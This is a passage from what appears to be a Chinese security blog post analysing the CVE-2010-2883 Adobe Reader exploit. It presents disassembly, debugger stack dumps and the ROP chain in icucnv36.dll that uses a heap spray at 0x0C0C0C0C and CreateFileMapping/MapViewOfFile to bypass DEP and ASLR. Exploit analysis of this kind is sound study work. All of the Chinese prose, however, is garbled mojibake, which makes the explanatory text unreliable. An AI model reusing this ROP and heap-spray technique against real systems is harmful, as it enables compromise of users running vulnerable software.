<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:0801BB21                 push    ebp</span><br><span class="line">.text:0801BB22                 mov     ebp, esp</span><br><span class="line">.text:0801BB24                 push    [ebp+arg_18]</span><br><span class="line">.text:0801BB27                 mov     ecx, [ebp+arg_0]</span><br><span class="line">.text:0801BB2A                 push    [ebp+arg_14]</span><br><span class="line">.text:0801BB2D                 mov     eax, [ecx]</span><br><span class="line">.text:0801BB2F                 push    [ebp+arg_10]</span><br><span class="line">.text:0801BB32                 inc     dword_823A6A0</span><br><span class="line">.text:0801BB38                 push    [ebp+arg_C]</span><br><span class="line">.text:0801BB3B                 push    [ebp+arg_8]</span><br><span class="line">.text:0801BB3E                 push    [ebp+arg_4]</span><br><span class="line">.text:0801BB41                 call    dword ptr [eax]</span><br></pre></td></tr></table></figure>
<p>å†è¿›å…¥[eax]å‡½æ•°å¤„ï¼Œå³0x808b116ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">.text:0808B116                 push    ebp</span><br><span class="line">.text:0808B117                 mov     ebp, esp</span><br><span class="line">.text:0808B119                 push    ecx</span><br><span class="line">.text:0808B11A                 push    ebx</span><br><span class="line">.text:0808B11B                 push    esi</span><br><span class="line">.text:0808B11C                 push    edi</span><br><span class="line">.text:0808B11D                 mov     edi, [ebp+arg_0]</span><br><span class="line">.text:0808B120                 push    edi</span><br><span class="line">.text:0808B121                 mov     esi, ecx</span><br><span class="line">.text:0808B123                 call    sub_808B02A</span><br><span class="line">.text:0808B128                 xor     ebx, ebx</span><br><span class="line">.text:0808B12A                 test    al, al</span><br><span class="line">.text:0808B12C                 jz      loc_808B2CB</span><br><span class="line">.text:0808B132                 cmp     [ebp+arg_14], bl</span><br><span class="line">.text:0808B135                 jnz     loc_808B2CB           &lt;--------è·³è½¬å®ç°</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">.text:0808B2CB</span><br><span class="line">.text:0808B2CB loc_808B2CB:                            ; CODE XREF: sub_808B116+16j</span><br><span class="line">.text:0808B2CB                                         ; sub_808B116+1Fj</span><br><span class="line">.text:0808B2CB                 mov     eax, [esi]</span><br><span class="line">.text:0808B2CD                 mov     [ebp+arg_17], bl</span><br><span class="line">.text:0808B2D0                 call    dword ptr [eax+70h]</span><br><span class="line">.text:0808B2D3                 push    edi</span><br><span class="line">.text:0808B2D4                 lea     ecx, [esi+14h]</span><br><span class="line">.text:0808B2D7                 call    sub_801E540</span><br><span class="line">.text:0808B2DC                 mov     byte ptr [esi+0E0h], 1</span><br><span class="line">.text:0808B2E3                 mov     eax, [edi+3Ch]</span><br><span class="line">.text:0808B2E6                 cmp     eax, ebx</span><br><span class="line">.text:0808B2E8                 mov     [esi+2F4h], eax</span><br><span class="line">.text:0808B2EE                 mov     [esi+2F8h], ebx</span><br><span class="line">.text:0808B2F4                 mov     [ebp+var_4], ebx</span><br><span class="line">.text:0808B2F7                 jnz     short loc_808B300</span><br><span class="line">.text:0808B2F9</span><br><span class="line">.text:0808B2F9 loc_808B2F9:                            ; CODE XREF: sub_808B116+28Ej</span><br><span class="line">.text:0808B2F9                 xor     al, al</span><br><span class="line">.text:0808B2FB                 jmp     loc_808B594</span><br><span class="line">.text:0808B300 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0808B300</span><br><span class="line">.text:0808B300 loc_808B300:                            ; CODE XREF: sub_808B116+1E1j</span><br><span class="line">.text:0808B300                 lea     ecx, [ebp+var_4]</span><br><span class="line">.text:0808B303                 push    ecx</span><br><span class="line">.text:0808B304                 push    ebx</span><br><span class="line">.text:0808B305                 push    3</span><br><span class="line">.text:0808B307                 push    eax</span><br><span class="line">.text:0808B308                 call    dword ptr [eax]</span><br></pre></td></tr></table></figure>
<p>å†è¿›å…¥[eax]å¤„çš„å­˜æ”¾åœ°å€ï¼Œå®é™…ä¸Šæ˜¯æ ˆä¸­å­˜æ”¾çš„åœ°å€ï¼š</p>
<p>eaxï¼š0x0012E6D0ï¼Œcallåœ°å€ï¼š0x4A80CB38  è¿”å›åˆ° icucnv36.4A80CB38 æ¥è‡ª icucnv36.4A846C49</p>
<p>è€Œstrcatæ‹¼æ¥çš„åœ°å€æ˜¯ä»0x0012E4D8å¼€å§‹çš„ã€‚</p>
<p>ç»§ç»­çœ‹æ¥ä¸‹æ¥çš„è°ƒç”¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4A80CB38    81C5 94070000   add ebp,0x794</span><br><span class="line">4A80CB3E    C9              leave</span><br><span class="line">4A80CB3F    C3              retn</span><br></pre></td></tr></table></figure>
<ol>
<li>ç¬¬ä¸€æ¡æŒ‡ä»¤</li>
</ol>
<p>è°ƒç”¨å‰ï¼šebp â€“&gt; 0x0012DD48</p>
<p>è°ƒç”¨åï¼šebp â€“&gt; 0x0012E4DC</p>
<ol start="2">
<li>ç¬¬äºŒæ¡æŒ‡ä»¤</li>
</ol>
<p>esp â€“&gt; 0x0012E4E0</p>
<p>ebp â€“&gt; 0xE78B53AB</p>
<ol start="3">
<li>ç¬¬ä¸‰æ¡æŒ‡ä»¤</li>
</ol>
<p>eip â€“&gt; 0x4A82A714  icucnv36.4A82A714</p>
<p>æ¥ä¸‹å»çš„ROPï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4A82A714    5C              pop esp                                  ; 0C0C0C0C</span><br><span class="line">4A82A715    C3              retn</span><br></pre></td></tr></table></figure>
<p>esp â€“&gt; 0x0c0c0c0c</p>
<p>æ¥ä¸‹å»å°±æ˜¯åœ¨å †å†…å­˜0x0c0c0c0cå¤„æ„é€ å¥½çš„shellcodeäº†ã€‚</p>
<p>è¿™ç§åœ¨0x0c0c0c0cå¤„æ„é€ shellcodeçš„æ–¹æ³•æ˜¯å †å–·å°„ã€‚</p>
<h3 id="æµç¨‹åœ¨æ ˆä¸­çš„æ‰§è¡Œæƒ…å†µï¼š"><a href="#æµç¨‹åœ¨æ ˆä¸­çš„æ‰§è¡Œæƒ…å†µï¼š" class="headerlink" title="æµç¨‹åœ¨æ ˆä¸­çš„æ‰§è¡Œæƒ…å†µï¼š"></a>æµç¨‹åœ¨æ ˆä¸­çš„æ‰§è¡Œæƒ…å†µï¼š</h3><p>æˆ‘ç”»äº†ä¸€ä¸ªå›¾ï¼Œå¯ä»¥è‡ªè¡Œè¾¹è°ƒè¯•è¾¹å‚è€ƒæˆ‘ç”»çš„åœ¨æ ˆä¸­æ‰§è¡Œçš„æµç¨‹å›¾ã€‚</p>
<p><img src="/CVE-2010-2883/liucheng.png" alt="liucheng"></p>
<p>å¯ä»¥çœ‹å‡ºæ¥è¯¥è·³è½¬çš„ç¨³å®šæ€§ä¸»è¦æ¥æºäº0x4A80CB38å’Œ0x4A82A714è¿™ä¸¤å¤„åœ°å€ï¼Œä¸¤å¤„åœ°å€éƒ½ä½äºicucnv26.dllçš„åœ°å€ç©ºé—´ï¼Œè€Œåœ¨Adobeçš„å„ä¸ªç‰ˆæœ¬ä¸Šï¼Œè¿™ä¸ªdllä¸Šçš„ä¸¤å¤„åœ°å€ä¸€ç›´ä¸å˜ï¼Œæ‰€ä»¥è¯¥exploitåœ¨å„ä¸ªç‰ˆæœ¬éƒ½å¾ˆç¨³å®šã€‚</p>
<h3 id="æ‰§è¡Œåˆ°å †å–·å°„å-ï¼š"><a href="#æ‰§è¡Œåˆ°å †å–·å°„å-ï¼š" class="headerlink" title="æ‰§è¡Œåˆ°å †å–·å°„å ï¼š"></a>æ‰§è¡Œåˆ°å †å–·å°„å ï¼š</h3><p>è¿”å›åˆ°0x0C0C0C0Cåæ ˆä¸­çš„æƒ…å†µï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0C0C0C0C   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0C10   4A8A0000  icucnv36.4A8A0000</span><br><span class="line">0C0C0C14   4A802196  icucnv36.4A802196</span><br><span class="line">0C0C0C18   4A801F90  icucnv36.4A801F90</span><br><span class="line">0C0C0C1C   4A84903C  &lt;&amp;KERNEL32.CreateFileA&gt;</span><br><span class="line">0C0C0C20   4A80B692  icucnv36.4A80B692</span><br><span class="line">0C0C0C24   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0C28   4A8522C8  icucnv36.4A8522C8</span><br><span class="line">0C0C0C2C   10000000  sqlite.10000000</span><br><span class="line">0C0C0C30   00000000</span><br></pre></td></tr></table></figure>
<p>å…ˆè·³åˆ°0x4A8063A5å¤„ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4A8063A5    59              pop ecx                                  ; icucnv36.4A8A0000</span><br><span class="line">4A8063A6    C3              retn</span><br></pre></td></tr></table></figure>
<p>è€Œåè½¬å…¥0x4A802196,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4A802196    8901            mov dword ptr ds:[ecx],eax</span><br><span class="line">4A802198    C3              retn</span><br></pre></td></tr></table></figure>
<p>å†è½¬å…¥0x4A801F90ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4A801F90    58              pop eax                               ; &lt;&amp;KERNEL32.CreateFileA&gt;</span><br><span class="line">4A801F91    C3              retn</span><br></pre></td></tr></table></figure>
<p>è½¬å…¥0x4A80B692ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4A80B692  - FF20            jmp dword ptr ds:[eax]                   ; kernel32.CreateFileA</span><br></pre></td></tr></table></figure>
<p>è°ƒç”¨CreateFileå‡½æ•°ï¼Œå†æŸ¥çœ‹æ ˆä¸­çš„å†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0C0C0C24   4A801064  /CALL åˆ° CreateFileA</span><br><span class="line">0C0C0C28   4A8522C8  |FileName = &quot;iso88591&quot;</span><br><span class="line">0C0C0C2C   10000000  |Access = GENERIC_ALL</span><br><span class="line">0C0C0C30   00000000  |ShareMode = 0</span><br><span class="line">0C0C0C34   00000000  |pSecurity = NULL</span><br><span class="line">0C0C0C38   00000002  |Mode = CREATE_ALWAYS</span><br><span class="line">0C0C0C3C   00000102  |Attributes = HIDDEN|TEMPORARY</span><br><span class="line">0C0C0C40   00000000  \hTemplateFile = NULL</span><br></pre></td></tr></table></figure>
<p>åˆ›å»ºäº†ä¸€ä¸ªåä¸ºâ€œiso88591â€çš„æ–‡ä»¶ã€‚</p>
<p>æ‰§è¡Œå®Œè¯¥å‡½æ•°ä¹‹ååˆç”¨å‰é¢ROPè°ƒç”¨CreateFileAç›¸åŒçš„æ‰‹æ³•è°ƒç”¨äº†CreateFileMappingå‡½æ•°ï¼Œè¯¥å‡½æ•°åˆ›å»ºäº†æ–‡ä»¶å†…å­˜æ˜ å°„ã€‚æ­¤æ—¶è°ƒç”¨çš„å„ä¸ªå‚æ•°ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0C0C0C68   4A801064  /CALL åˆ° CreateFileMappingA</span><br><span class="line">0C0C0C6C   0000043C  |hFile = 0000043C</span><br><span class="line">0C0C0C70   00000000  |pSecurity = NULL</span><br><span class="line">0C0C0C74   00000040  |Protection = PAGE_EXECUTE_READWRITE</span><br><span class="line">0C0C0C78   00000000  |MaximumSizeHigh = 0x0</span><br><span class="line">0C0C0C7C   00010000  |MaximumSizeLow = 0x10000</span><br><span class="line">0C0C0C80   00000000  \MapName = NULL</span><br></pre></td></tr></table></figure>
<p>ååˆæ‰§è¡Œï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4A80B692  - FF20            jmp dword ptr ds:[eax]                 ; kernel32.MapViewOfFile</span><br></pre></td></tr></table></figure>
<p>è°ƒç”¨MapViewOfFileå‡½æ•°ï¼Œå„ä¸ªå‚æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0C0C0CA8   4A801064  /CALL åˆ° MapViewOfFile</span><br><span class="line">0C0C0CAC   00000440  |hMapObject = 00000440</span><br><span class="line">0C0C0CB0   00000022  |AccessMode = 0x22</span><br><span class="line">0C0C0CB4   00000000  |OffsetHigh = 0x0</span><br><span class="line">0C0C0CB8   00000000  |OffsetLow = 0x0</span><br><span class="line">0C0C0CBC   00010000  \MapSize = 10000 (65536.)</span><br></pre></td></tr></table></figure>
<p>åè°ƒç”¨memcpyå‡½æ•°ï¼Œå„ä¸ªå‚æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0C0C0D44   04490000  /CALL åˆ° memcpy</span><br><span class="line">0C0C0D48   04490000  |dest = 04490000</span><br><span class="line">0C0C0D4C   0C0C0D54  |src = 0C0C0D54</span><br><span class="line">0C0C0D50   00001000  \n = 1000 (4096.)</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå› ä¸ºæœ‰ç€DEPçš„æœºåˆ¶ï¼Œæ‰€ä»¥è¯´shellcodeåœ¨å †æ ˆä¸Šæ˜¯æ— æ³•æ‰§è¡Œçš„ï¼Œå› æ­¤è¿™é‡Œå°±å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ï¼Œç„¶åæ˜ å°„åˆ°å¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜åŒºåŸŸï¼Œå†å°†shellcodeæ‹·è´åˆ°è¯¥åŒºåŸŸï¼Œå°±å¯ä»¥æ‰§è¡Œshellcodeäº†ã€‚è€Œä¸”æ°å¥½æˆ‘ä»¬æ„é€ çš„ROPéƒ½å¤„äºicucnv36.dllï¼Œæ­¤å¤„ä¸å—aslrä¿æŠ¤ï¼ŒæˆåŠŸç»•è¿‡aslrã€‚</p>
<p><img src="/CVE-2010-2883/QQ20181006-142548@2x.png" alt="QQ20181006-142548@2x"></p>
<p>æˆåŠŸæ‰§è¡Œã€‚</p>

    
  </div>

  
      <div class="git"></div>
  

</article>


   
  <div class="text-center donation">
    <div class="inner-donation">
      <span class="btn-donation">æ”¯æŒä¸€ä¸‹</span>
      <div class="donation-body">
        <div class="tip text-center">æ‰«ä¸€æ‰«ï¼Œæ”¯æŒv1nke</div>
        <ul>
        
          <li class="item">
            <span>å¾®ä¿¡æ‰«ä¸€æ‰«</span>
            <img src="/images/qr-wechat.jpeg" alt="">
          </li>
        
          <li class="item">
            <span>æ”¯ä»˜å®æ‰«ä¸€æ‰«</span>
            <img src="/images/qr-wechat.jpeg" alt="">
          </li>
        
        </ul>
      </div>
    </div>
  </div>


   
  <div class="box-prev-next clearfix">
    <a class="show pull-left" href="/2018/09/28/arm_pwn/">
        <i class="icon icon-angle-left"></i>
    </a>
    <a class="show pull-right" href="/2018/10/21/2018æŠ¤ç½‘æ¯-pwn-writeup/">
        <i class="icon icon-angle-right"></i>
    </a>
  </div>




</div>


  <a id="backTop" class="back-top">
    <i class="icon-angle-up"></i>
  </a>




  <div class="modal" id="modal">
  <span id="cover" class="cover hide"></span>
  <div id="modal-dialog" class="modal-dialog hide-dialog">
    <div class="modal-header">
      <span id="close" class="btn-close">å…³é—­</span>
    </div>
    <hr>
    <div class="modal-body">
      <ul class="list-toolbox">
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/archives/"
              rel="noopener noreferrer"
              target="_self"
              >
              åšå®¢
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/tag/"
              rel="noopener noreferrer"
              target="_self"
              >
              æ ‡ç­¾
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/link/"
              rel="noopener noreferrer"
              target="_self"
              >
              å‹é“¾
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/about/"
              rel="noopener noreferrer"
              target="_self"
              >
              å…³äº
            </a>
          </li>
        
      </ul>

    </div>
  </div>
</div>



  
      <div class="fexo-comments comments-post">
    

    

    
    

    

    
    

  </div>

  

  <script type="text/javascript">
  function loadScript(url, callback) {
    var script = document.createElement('script')
    script.type = 'text/javascript';

    if (script.readyState) { //IE
      script.onreadystatechange = function() {
        if (script.readyState == 'loaded' ||
          script.readyState == 'complete') {
          script.onreadystatechange = null;
          callback();
        }
      };
    } else { //Others
      script.onload = function() {
        callback();
      };
    }

    script.src = url;
    document.getElementsByTagName('head')[0].appendChild(script);
  }

  window.onload = function() {
    loadScript('/js/bundle.js?235683', function() {
      // load success
    });
  }
</script>

</body>
</html>
